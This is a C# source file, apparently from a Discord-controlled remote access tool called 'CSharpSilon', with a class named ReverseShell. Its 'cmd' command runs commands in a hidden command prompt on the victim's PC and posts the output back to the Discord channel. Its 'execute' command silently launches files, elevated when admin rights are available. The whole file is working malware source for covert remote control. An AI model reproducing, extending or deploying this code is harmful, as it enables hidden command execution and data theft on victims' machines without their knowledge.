using System.Diagnostics;
using System.IO;
using Discord.Commands;
using Discord.WebSocket;
using System.Threading.Tasks;

namespace CSharpSilon.cmds
{
    public class ReverseShell : ModuleBase<SocketCommandContext>
    {
        [Command("cmd")]
        [Summary("Opens A Hidden Command Prompt And Executes Commands")]
        public async Task CMD([Remainder] string cmd)
        {
            var proc = Utils.App.execute(cmd);
            await ReplyAsync($"Command: \"{cmd}\" Executed.\nOutput: {proc.StandardOutput.ReadToEnd()}");
        }

        [Command("execute")]
        [Summary("Runs A Specific File On The User's PC, Args: NoWindow: bool (Default: True), Minimized: Bool (Default: True)")]
        public async Task Execute(string filepath, bool nowindow = true, bool minimized = true)
        {
            if (File.Exists(filepath))
            {
                System.Diagnostics.Process.Start(new ProcessStartInfo()
                {
                    FileName = filepath,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = nowindow,
                    WindowStyle = (minimized) ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Minimized,
                    Verb = Utils.App.IsAdmin() ? "runas" : ""
                });
                await ReplyAsync("File As Been Run.");
            }
            else
            {
                await ReplyAsync("File Path Doesn't Exist.");
            }
        }
    }
}